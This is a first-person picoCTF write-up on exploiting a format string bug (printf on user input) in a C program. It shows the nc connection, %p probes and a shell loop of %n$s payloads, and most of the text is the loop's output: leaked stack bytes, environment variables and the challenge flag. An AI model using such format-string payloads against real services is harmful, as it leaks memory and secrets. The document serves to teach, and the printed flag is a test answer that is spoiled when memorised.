I recently worked on a PicoCTF challenge where I had to exploit a vulnerability in a C program to retrieve a flag. The program interacted with the user by asking them to input a "story," then it printed the story back to the user with a twist.

By analyzing the code and the program’s behavior, I was able to identify a format string vulnerability that I exploited to leak sensitive memory content, eventually revealing the hidden flag.

When I first looked at the program, I noted that it had a function called `readflag()`, which opened and read the contents of a file named `flag.txt`. This immediately suggested that the flag was stored in that file, but I didn’t need to directly open the file myself. The `readflag()` function loaded the flag into a buffer, and the rest of the code printed it out based on user input. The program asked for a story and printed it back, which seemed innocent enough. 

However, something caught my attention when I reviewed the function `vuln()`. In this function, there was a line of code where the program directly printed user input using `printf()`:

```
printf(story);
```

This line stood out because the `printf()` function expects a format string as its first argument, and it will interpret special format specifiers in that string. I realized that if the user input could be manipulated to include these format specifiers (like `%s`, `%p`, or `%x`), they could influence how `printf()` behaved. This was a classic sign of a format string vulnerability.

At this point, I hypothesized that I could exploit this by injecting format specifiers into my input to read memory contents. The format string vulnerability occurs because the program didn't sanitize or control the user input that was being passed to `printf()`. Specifically, using `%p`, I could print out memory addresses stored in the stack, which might give me useful data, including pointers to the flag or other key information.

To test my hypothesis, I connected to the remote service using `nc` (Netcat):

```
nc saturn.picoctf.net 53330
```

I was prompted to "Tell me a story and then I'll tell you one >>" and initially tried inputting a simple string like "kanda". The response was a direct echo of my input, but that didn’t reveal anything useful. Then I decided to inject some format specifiers into my input to check for the vulnerability. I entered `%p%p%p%p%p`, a common test for printing values from the stack.

The output was:

```
0xffc19eb00xffc19ed00x80493460x702570250x70257025
```

This output looked like a series of memory addresses. These addresses pointed to data stored in memory, including potential pointers to the flag. I realized that this was the key to exploiting the vulnerability: I could use the format string specifiers to leak memory contents and find the flag.

Next, I decided to automate the process and try a range of format specifiers to print more meaningful strings. I used a simple shell loop that iterated through different specifiers from `%0$s` to `%999$s`, which would attempt to print out data from various locations in memory. Here's the script I used:

```
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 53330; done
```

After running the loop, I eventually saw the flag printed out:

This was the hidden flag, successfully retrieved by exploiting the format string vulnerability.

The vulnerability was found because the program improperly handled user input by passing it directly to `printf()` without any checks. This allowed me to inject format specifiers into my input, causing the program to leak memory contents. By printing stack values and iterating through memory locations, I was able to locate the flag stored in memory.

This challenge was a great example of how format string vulnerabilities can be used to leak sensitive data, and it highlights the importance of properly handling user input in C programs. It also serves as a reminder of how small oversights in function design, such as failing to sanitize format strings, can lead to exploitable vulnerabilities. Through systematic exploitation and some simple scripting, I was able to extract the flag from the program’s memory.

```
root@LAPTOP-GEM5SRL1:/home/Cryptonite# nc saturn.picoctf.net 53330
Tell me a story and then I'll tell you one >> kanda
Here's a story -
kanda

root@LAPTOP-GEM5SRL1:/home/Cryptonite#
root@LAPTOP-GEM5SRL1:/home/Cryptonite# nc saturn.picoctf.net 53330
Tell me a story and then I'll tell you one >> %p%p%p%p%p
Here's a story -
0xffc19eb00xffc19ed00x80493460x702570250x70257025
```

```
root@LAPTOP-GEM5SRL1:~# cd /home/Cryptonite
root@LAPTOP-GEM5SRL1:/home/Cryptonite#  for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 53330; done
Tell me a story and then I'll tell you one >> Here's a story -
%0$s
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
�G�
Tell me a story and then I'll tell you one >> Here's a story -
�ú,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
�.
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�������
Tell me a story and then I'll tell you one >> Here's a story -
�(��g}��g}��g}��g}��g}��g}��g}��h}��
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -
�ю�
Tell me a story and then I'll tell you one >> Here's a story -
��e�

Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
Tell me a story and then I'll tell you one >> Here's a story -
�Jr�
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
$�
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�(��gm��gm��gm��gm��gm��gm��gm��hm��
Tell me a story and then I'll tell you one >> Here's a story -
����������؉ǀ�u��^H�C�p��s��u��C
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�i���
��0�����@��������������p�����-����
Tell me a story and then I'll tell you one >> Here's a story -
������
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
������0���c��@=����]������pf���н��A�
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
�
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
�N���N��
Tell me a story and then I'll tell you one >> Here's a story -
��������Ů��Ю����������?���P���^���k���������������ӯ��
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
����
    P�ߏ
Tell me a story and then I'll tell you one >> Here's a story -
l}
Tell me a story and then I'll tell you one >> Here's a story -
l}
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
����
    P�ߏ
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
�>���>��
Tell me a story and then I'll tell you one >> Here's a story -
�N���N���N���N���N���N��?O��PO��^O��kO���O���O���O���O��
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
l}
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
D���0�Ђ��<���
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
$�
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
l}
Tell me a story and then I'll tell you one >> Here's a story -
l}
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
��1�^����PTR�#
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
Z�
  $�$�D$�

Tell me a story and then I'll tell you one >> Here's a story -
��U��W��
Tell me a story and then I'll tell you one >> Here's a story -
�)v���t�0�X�Z�@m`��Z�U���Z�p�Z����X�q`�
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
��1�^����PTR�#
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
�$�f�f�����f�f�f�f�f���$�f�f�f�f�f�f��@=@t$�
Tell me a story and then I'll tell you one >> Here's a story -
���L$����q�U��SQ��������&,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
������
Tell me a story and then I'll tell you one >> Here's a story -
��U�k
Tell me a story and then I'll tell you one >> Here's a story -
��Ë,$�
Tell me a story and then I'll tell you one >> Here's a story -
��U��W��
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
/challenge/vuln
Tell me a story and then I'll tell you one >> Here's a story -
2>&1
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
HOSTNAME=challenge
Tell me a story and then I'll tell you one >> Here's a story -
PWD=/challenge
Tell me a story and then I'll tell you one >> Here's a story -
HOME=/root
Tell me a story and then I'll tell you one >> Here's a story -
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_
Tell me a story and then I'll tell you one >> Here's a story -
SHLVL=1
Tell me a story and then I'll tell you one >> Here's a story -
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
Tell me a story and then I'll tell you one >> Here's a story -
_=/usr/bin/socat
Tell me a story and then I'll tell you one >> Here's a story -
SOCAT_PID=245
Tell me a story and then I'll tell you one >> Here's a story -
SOCAT_PPID=8
Tell me a story and then I'll tell you one >> Here's a story -
SOCAT_VERSION=1.7.3.3
Tell me a story and then I'll tell you one >> Here's a story -
SOCAT_SOCKADDR=192.168.230.226
Tell me a story and then I'll tell you one >> Here's a story -
SOCAT_SOCKPORT=9112
Tell me a story and then I'll tell you one >> Here's a story -
SOCAT_PEERADDR=106.222.200.194
Tell me a story and then I'll tell you one >> Here's a story -
SOCAT_PEERPORT=7836
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
QRU��4̀]ZY�̐����&
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
ELF
Tell me a story and then I'll tell you one >> Here's a story -
```

![Screenshot (1267)](https://github.com/user-attachments/assets/a617d9a0-7f73-48ba-a989-e55acc8ed4fa)


![Screenshot (1268)](https://github.com/user-attachments/assets/16164f0d-967a-4d94-8362-6b11b236fa72)


**picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}**
